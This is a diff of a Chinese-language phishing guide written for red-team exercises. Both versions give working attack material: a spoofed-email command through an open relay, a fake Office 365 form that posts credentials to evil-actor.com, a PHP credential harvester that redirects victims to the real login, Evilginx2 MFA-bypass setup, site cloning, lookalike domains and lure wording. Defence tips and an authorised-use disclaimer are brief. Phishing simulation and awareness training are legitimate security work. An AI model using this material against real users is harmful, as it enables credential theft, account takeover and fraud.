@@ -1,141 +1,230 @@
 # 社工钓鱼技术实战指南
 
-> 社会工程学（Social Engineering）是渗透测试中最"低成本高回报"的环节之一，往往绕过最坚固的技术防御，直接攻击最薄弱的"人"。
+---
 
-## 1. 钓鱼攻击的分类与场景
+## 📋 目录
 
-按攻击目标范围与针对性，常见的钓鱼攻击可分为以下几类：
-
-| 类型 | 说明 | 典型场景 |
-|------|------|---------|
-| 批量钓鱼（Phishing） | 大规模群发邮件，撒网式 | 伪造银行/快递/税务通知 |
-| 鱼叉钓鱼（Spear Phishing） | 针对特定个人/部门，高度定制 | 伪造 CEO 给财务的转账邮件 |
-| 鲸钓（Whaling） | 针对高管级别的鱼叉钓鱼 | 伪造董事会邮件 + 仿冒 OA 登录 |
-| 水坑攻击（Watering Hole） | 攻陷目标常访问的网站，植入恶意代码 | 攻击行业论坛/常用工具站 |
-| 短信钓鱼（Smishing） | 通过短信发送恶意链接 | "您有快递未取，请点击..." |
-| 电话钓鱼（Vishing） | 冒充客服/IT/HR 诱导泄露信息 | 冒充 IT 索要 VPN 账号 |
-| 域名仿冒（Typosquatting） | 注册相似域名，仿冒真实站点 | `taoboo.com`、`micr0soft.com` |
-
-### 1.1 钓鱼攻击链
-
-一次完整的钓鱼攻击通常遵循以下链路：
-
-```
-情报收集 → 伪造内容（邮件/站点） → 发送 → 受害者点击 →
-payload 执行 → 主机沦陷 → 凭据窃取 → 横向移动 → 目标达成
-```
-
-## 2. 邮件伪造与发送基础设施
-
-邮件钓鱼的核心在于"看起来像真的"。攻击者需要搭建或租用邮件发送基础设施，并绕过 SPF / DKIM / DMARC。
-
-### 2.1 仿冒邮件的关键要素
-
-- **发件人显示名欺骗**：`From: "系统管理员 <admin@target.com>"`，部分邮件客户端优先展示显示名
-- **相似域名**：`target-support.com`、`target-corp.com`、`targét.com`（IDN 同形异义字攻击）
-- **子域名控制**：控制了 `a.target.com` 后可能可伪造 `@target.com`（取决于 SPF 配置）
-- **回复地址**：`Reply-To: hr@evil.com`
-
-### 2.2 绕过 SPF / DKIM / DMARC 的思路
-
-```bash
-# 检查目标的邮件安全配置
-dig txt target.com          # SPF 记录
-dig txt _dmarc.target.com   # DMARC 策略（p=none/quarantine/reject）
-dig selector._domainkey.target.com txt  # DKIM 公钥
-
-# 当 SPF 允许宽松配置（如 ~all 或存在失效邮件服务器）时，
-# 攻击者可通过第三方中继伪造邮件
-swaks --to victim@target.com \
-      --from "admin@target.com" \
-      --server open_relay_ip:25 \
-      --header "Subject: [紧急] 账户密码即将过期" \
-      --body "请访问 https://mail.target-verify.com 完成验证"
-```
-
-### 2.3 常用钓鱼工具
-
-| 工具 | 用途 |
-|------|------|
-| `SET（Social-Engineer Toolkit）` | 一体化钓鱼工具包，含邮件、仿冒站点、payload |
-| `Gophish` | 开源钓鱼平台，邮件模板 + 仿冒登陆页 + 数据统计 |
-| `Evilginx2` | 中间人钓鱼框架，可拦截 MFA 令牌 |
-| `King Phisher` | 红队钓鱼演练平台 |
-| `swaks` | 命令行 SMTP 测试工具 |
-| `spf-check` | SPF/DMARC 检测工具 |
-
-## 3. 仿冒站点与 OAuth 钓鱼
-
-仿冒站点的核心是**视觉欺骗**——让受害者相信自己在访问真实系统。
-
-### 3.1 仿冒登录页的制作
-
-```html
-<!-- 仿冒 Office 365 登录表单（关键字段与真实一致） -->
-<form action="https://evil-actor.com/steal" method="POST">
-  <input type="text" name="login" placeholder="公司邮箱" required>
-  <input type="password" name="passwd" placeholder="密码" required>
-  <input type="hidden" name="redirect" value="https://outlook.office.com">
-  <button type="submit">登 录</button>
-</form>
-```
-
-提交后，攻击者后台记录凭据，再将受害者 302 跳转到真实登录页，降低被怀疑的概率。
-
-### 3.2 Evilginx2 中间人钓鱼
-
-对于开启了 MFA（多因素认证）的企业，传统凭据钓鱼无法登录。**Evilginx2** 作为中间人代理，可完整转发受害者与真实站点之间的交互，同时抓取有效会话 Cookie / Token：
-
-```bash
-# Evilginx2 示例配置
-phishlets enable o365
-lures create o365
-lures edit 0 redirect_url https://outlook.office.com
-lures edit 0 phishlet o365
-lures get-url 0
-# 生成形如 https://login.target-verify.com 的钓鱼链接
-```
-
-受害者在钓鱼页输入用户名、密码、MFA 动态码后，攻击者获得完整有效的 Office 365 会话，可直接访问邮箱、Teams、OneDrive。
-
-### 3.3 OAuth 应用授权钓鱼
-
-诱导受害用户"使用 Google / Microsoft 账号登录"第三方应用，授予高权限 Scope（如 `Mail.ReadWrite`、`Files.ReadWrite.All`）。即使受害者修改密码，授权令牌仍有效——这种方式比传统钓鱼更隐蔽，因为不涉及明文密码窃取。
-
-## 4. 社工话术与鱼叉钓鱼情报准备
-
-鱼叉钓鱼的关键在于**情报与语境**。攻击前需要对目标个人进行充分的信息收集：
-
-### 4.1 情报收集点
-
-- **公司组织架构**：LinkedIn / 脉脉 / 官网公开团队页
-- **同事姓名 / 职位**：用于伪造内部邮件
-- **近期业务事件**：如项目招标、合同签署、人员变动
-- **常用工具**：钉钉、飞书、企业微信、Slack、VPN 系统
-- **个人兴趣 / 家庭信息**：社交媒体公开内容
-
-### 4.2 常见邮件诱饵模板
-
-| 诱饵主题 | 目标角色 | 话术示例 |
-|---------|---------|---------|
-| 工资条 / 薪酬调整 | 全公司 | "请查收 9 月份工资明细（含个税调整）" |
-| 法务函 / 律师信 | 管理层 / 法务 | "收到关于贵司某合同的律师函，请查收附件" |
-| 未读会议邀请 | 各部门 | "【会议提醒】项目评审会议材料请查阅" |
-| 快递 / 海关通知 | 个人 | "您有国际包裹待清关，请上传身份证信息" |
-| IT 账号密码重置 | 技术人员 | "您的 VPN 密码将于 2 小时后过期，点击重置" |
-| 招标 / 供应商报价 | 采购 | "XX 公司报价单（修订版 v3）请确认" |
-
-## 5. 红队演练中的反钓鱼建议
-
-**作为防守方 / 红蓝对抗演练**，企业应做好以下几点：
-
-1. **DMARC p=reject**：严格阻止未认证邮件
-2. **邮件安全网关**：扫描附件、链接、沙箱分析
-3. **安全意识培训**：定期模拟钓鱼演练，建立点击上报机制
-4. **MFA 强制 + 会话保护**：关键系统强制 MFA，并启用条件访问
-5. **终端 EDR / 沙箱**：钓鱼附件落地即检测
-6. **敏感操作二次确认**：财务转账等操作必须电话 / 当面确认
+1. [社工攻击概述](#一社工攻击概述)
+2. [钓鱼邮件制作](#二钓鱼邮件)
+3. [邮件伪造技术](#三邮件伪造)
+4. [钓鱼网站搭建](#四钓鱼网站)
+5. [Gophish 平台实战](#五gophish平台)
+6. [成功案例与防御](#六防御)
 
 ---
 
-> 社会工程学的本质不是技术，而是对"信任"的利用。攻防双方的博弈，归根结底是对人的判断力的考验。本指南仅用于合法授权的红队演练与企业安全意识培训，严禁用于未授权的攻击活动。
+## 一、社工攻击概述
+
+```
+社会工程 = 利用人的心理弱点而非技术漏洞
+
+社工攻击三角:
+  ✓ 权威感 — 假扮领导/IT/公安
+  ✓ 紧迫感 — "账户即将被冻结" "24小时内必须处理"
+  ✓ 社交证明 — 伪造同事推荐/群聊/内部通知
+
+常见社工类型:
+  ✦ 钓鱼邮件 (Phishing) — 最常见的入口
+  ✦ 鱼叉钓鱼 (Spear Phishing) — 精准目标,定制邮件
+  ✦ 电话钓鱼 (Vishing) — 假冒IT/客服
+  ✦ 短信钓鱼 (Smishing) — 假冒快递/银行
+  ✦ USB丢包 — 丢弃含恶意文件的U盘
+  ✦ 尾随进门 — 跟着员工进入门禁区
+```
+
+---
+
+## 二、钓鱼邮件
+
+### 2.1 邮件模板设计
+
+```
+高效钓鱼邮件要素:
+
+① 可信发件人
+   [CEO名字]、[IT部门]、[HR部门]、[客户名称]
+   使用真实部门 + 真实人名
+
+② 合理主题
+   "紧急: VPN密码重置通知"
+   "[公司名] 2026年薪资调整确认"
+   "关于昨天会议的文件补充"
+   "Notice: Your mailbox is almost full"
+
+③ 自然正文
+   - 模仿公司内部邮件的语气和格式
+   - 使用真实的签名模板
+   - 提到真实的项目/事件/人名
+
+④ 有效诱导
+   - "请立即点击链接重置密码"
+   - "请下载附件查看会议纪要"
+   - "请回复此邮件确认收到"
+```
+
+### 2.2 素材收集
+
+```
+社工前信息收集:
+
+目标企业:
+  ✦ 官网 → 组织架构/领导名字/产品/事件
+  ✦ LinkedIn → 员工名单/职位/工作内容
+  ✦ 招聘网站 → 使用的技术/系统/流程
+  ✦ 工商信息 → 法人/注册信息
+  ✦ 微信公众号 → 内部活动/通知格式
+
+邮件格式:
+  ✦ 收到过真实邮件 → 分析:
+    - 签名格式
+    - 称呼习惯
+    - 邮件客户端特征
+    - 发件域名和发件服务器
+```
+
+---
+
+## 三、邮件伪造
+
+### 3.1 SPF/DKIM/DMARC 检测
+
+```bash
+# 检查目标域名的邮件安全配置
+# SPF 检查
+dig TXT example.com | grep spf
+
+# DKIM 检查
+dig TXT default._domainkey.example.com
+
+# DMARC 检查
+dig TXT _dmarc.example.com
+
+# 评估:
+# DMARC policy = none → 邮件可被伪造!
+# DMARC policy = reject → 较难伪造
+# SPF -all → 只能从SPF允许的IP发信
+# SPF ~all/?all → 宽松,可尝试伪造
+```
+
+### 3.2 相似域名注册
+
+```
+域名欺骗技巧:
+
+字符替换:
+  example.com → examp1e.com (l→1)
+  example.com → exampie.com (l→i)
+  example.com → exarnple.com (m→rn)
+
+前缀/后缀:
+  example.com → mail-example.com
+  example.com → example-secure.com
+
+使用工具:
+  dnstwist example.com → 自动生成相似域名列表
+```
+
+---
+
+## 四、钓鱼网站
+
+### 4.1 克隆目标网站
+
+```bash
+# 使用 SingleFile 或 wget 克隆
+wget -r -l 2 -p -k https://mail.example.com/login
+
+# 修改:
+# ① 表单提交地址 → 自己的服务器
+# ② 隐藏克隆痕迹
+# ③ 添加数据收集逻辑
+
+# 使用 Evilginx — 反向代理钓鱼(可过MFA)
+git clone https://github.com/kgretzky/evilginx2
+cd evilginx2 && make && ./bin/evilginx
+
+# 配置:
+config domain phishing-example.com
+config ip 1.2.3.4
+phishlets hostname o365 phishing-example.com
+phishlets enable o365
+lures create o365
+lures get-url 0
+# 生成钓鱼链接 → 受害者访问 → 实时捕获凭据+Session Cookie
+```
+
+### 4.2 凭据收集
+
+```php
+// login.php — 收集凭据后跳转
+<?php
+// 记录凭据
+$username = $_POST['username'] ?? '';
+$password = $_POST['password'] ?? '';
+$ip = $_SERVER['REMOTE_ADDR'];
+$ua = $_SERVER['HTTP_USER_AGENT'];
+
+file_put_contents('creds.txt', 
+    date('Y-m-d H:i:s') . " | $ip | $username | $password | $ua\n",
+    FILE_APPEND);
+
+// 跳转到真实登录页(降低怀疑)
+header('Location: https://mail.example.com/login?retry=1');
+?>
+```
+
+---
+
+## 五、Gophish 平台
+
+```bash
+# 部署
+wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
+unzip gophish-v0.12.1-linux-64bit.zip
+chmod +x gophish && ./gophish
+
+# 管理端: https://localhost:3333
+# (首次登录需改密码)
+
+# 配置四步:
+# ① Sending Profiles → SMTP配置
+# ② Landing Pages → 钓鱼页面(导入/克隆)
+# ③ Email Templates → 邮件模板
+# ④ Users & Groups → 目标邮箱列表
+
+# 启动Campaign:
+# → 实时查看: 谁打开了邮件? 谁点击了链接? 谁输入了凭据?
+```
+
+---
+
+## 六、防御
+
+```
+个人防御:
+  ✦ 核对发件人邮箱完整地址(不是显示名!)
+  ✦ 悬停链接查看真实URL
+  ✦ 可疑邮件通过独立渠道(电话/当面)确认
+  ✦ 不轻易打开附件
+  ✦ 使用密码管理器(不会在钓鱼站输入密码)
+
+企业防御:
+  ✓ DMARC策略设为reject
+  ✓ SPF严格(-all)
+  ✓ DKIM签名
+  ✓ 邮件网关+AI钓鱼检测
+  ✓ SPF/DKIM/DMARC 完全配置
+  ✓ 安全意识培训(季度钓鱼测试)
+  ✓ 浏览器隔离策略(远程渲染)
+```
+
+---
+
+## ✅ Checklist
+
+- [ ] 信息收集(组织/人员/邮件格式)
+- [ ] 邮件模板设计
+- [ ] 相似域名注册
+- [ ] 钓鱼网站克隆
+- [ ] Gophish 配置
+- [ ] 钓鱼演练 → 统计 → 培训
